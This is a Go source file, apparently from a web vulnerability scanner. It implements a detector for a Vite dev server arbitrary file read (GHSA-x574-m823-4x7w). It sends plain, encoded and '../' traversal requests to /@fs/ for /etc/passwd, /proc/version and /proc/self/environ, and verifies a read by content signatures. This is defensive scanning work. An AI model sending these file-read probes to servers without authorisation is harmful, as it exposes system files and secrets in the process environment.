package active

// Arbitrary file read through a Vite development server.
//
// # The advisory
//
// GHSA-x574-m823-4x7w: a Vite dev server serves any file on the disk through its
// `/@fs/` bridge, and the check that was supposed to keep it inside the project
// root could be walked out of with `..` and with an encoded separator. The
// endpoint existed to let the browser import a module from outside the served
// directory during development, and it does exactly that — from wherever it is
// addressed.
//
// The precondition is what makes it worth automating: a dev server is a
// development dependency, and a bundle that still carries the dev server's own
// protocol means the build that shipped it was made by something reachable. The
// analyser reports that precondition as `vite_dev_server` (`/@fs/`,
// `import.meta.env`, `__vite`), and this detector asks the server itself.
//
// # What counts as a read
//
// A `/@fs/` answer is not a read. Every Vite version answers `/@fs/…` for a path
// outside the root with a 403 or a 404, and a dev server that answers 200 to
// everything would answer 200 to the probe too. So the proof is a *content*
// signature: the body has to contain a line only that file contains. The
// signatures are fixed and each one is a line format rather than a word —
// `root:x:0:0:` is a line of `/etc/passwd`, not a word that appears in an error
// page.
//
// `Fresh` is the check that makes this a finding rather than a coincidence: the
// signature has to be in the probe's body and absent from the run's baseline, so
// a site whose error page happens to quote the signature does not produce a row on
// every run.

import (
	"context"
	"net/http"
	"net/url"
	"strings"
)

// ViteFSRead probes the `/@fs/` bridge of a Vite development server.
type ViteFSRead struct{}

// Name implements Module.
func (ViteFSRead) Name() string { return "vite_fs_read" }

// Level implements Module.
//
// Host level: the bridge belongs to the dev server, not to a page, and every URL
// on the origin answers it the same way.
func (ViteFSRead) Level() Level { return LevelHost }

// viteReadTarget is one file to ask for, and the line that proves the answer was
// that file.
//
// Every target carries a signature, and that is a rule rather than an omission.
// A target without one — `/etc/hostname`, whose content is whatever the host is
// called — cannot be verified, and the check that replaced it ("the body is not
// empty") accepted the body of *any* server that answers 200 to everything:
// `TestAServerThatAnswersEverythingIsNotARead` caught exactly that, reporting a
// critical arbitrary-file-read on a server that returned `<html>hello</html>` for
// every path. A probe with no signature is not a weak proof, it is no proof, and a
// proof this package cannot produce is a target it does not have.
type viteReadTarget struct {
	path      string
	signature string
	// description names what was asked for, so the evidence sentence is a
	// sentence and not a status code.
	description string
}

var viteReadTargets = []viteReadTarget{
	{path: "/etc/passwd", signature: "root:x:0:0:", description: "/etc/passwd"},
	{path: "/proc/version", signature: "Linux version", description: "/proc/version"},
	{path: "/proc/self/environ", signature: "PATH=", description: "the server process environment"},
}

// viteEncodings are the ways the same file is asked for.
//
// Each is a separate request rather than one "best" form, because the answer
// differs by server: a Vite behind a proxy that normalises `..` rejects the
// traversal form and accepts the encoded one, and a server that normalises nothing
// is the one the advisory is about.
func viteEncodings(path string) []string {
	encoded := strings.ReplaceAll(path, "/", "%2f")
	traversal := strings.Repeat("../", 6) + strings.TrimPrefix(path, "/")
	return []string{path, encoded, traversal}
}

// Scan probes the bridge.
func (m ViteFSRead) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	origin, err := url.Parse(p.URL)
	if err != nil || origin.Host == "" {
		return nil
	}
	var findings []Finding
	for _, target := range viteReadTargets {
		if ctx.Err() != nil {
			return findings
		}
		for _, encoding := range viteEncodings(target.path) {
			probe := origin.Scheme + "://" + origin.Host + "/@fs" + encoding
			answered, err := t.Do(ctx, http.MethodGet, probe, nil, false, nil)
			if err != nil || answered == nil {
				continue
			}
			if answered.StatusCode != http.StatusOK {
				continue
			}
			// The signature is the proof and it is required. A body that merely
			// arrives is not a file read, and a server that answers 200 to
			// everything answers this probe too.
			if !Fresh(baseline, answered, target.signature) {
				continue
			}
			finding, _ := NewFinding(Spec{
				Module:   "vite_fs_read",
				Title:    "Arbitrary file read through the Vite dev server (/@fs/)",
				Claimed:  SeverityHigh,
				Tier:     TierVerified,
				Point:    p,
				Payload:  probe,
				Evidence: viteEvidence(answered.Body, target),
				Description: "The dev server's file bridge returned the contents of " + target.description +
					". The endpoint is meant to serve modules from outside the served directory during " +
					"development, and the path check that was supposed to keep it inside the project root " +
					"can be walked out of (GHSA-x574-m823-4x7w).",
				Remediation: "Do not expose a Vite dev server. If it must be reachable, keep it bound to the " +
					"loopback interface and behind authentication, and upgrade to a release that fixes " +
					"GHSA-x574-m823-4x7w.",
			})
			return []Finding{finding}
		}
	}
	return nil
}

// viteEvidence is the excerpt the finding rests on: the signature line when the
// target has one, and the head of the body when it does not.
func viteEvidence(body string, target viteReadTarget) string {
	if target.signature != "" {
		if match := strings.Index(body, target.signature); match >= 0 {
			return Snippet(body, target.signature, 200)
		}
	}
	return Snippet(body, strings.TrimSpace(body), 200)
}
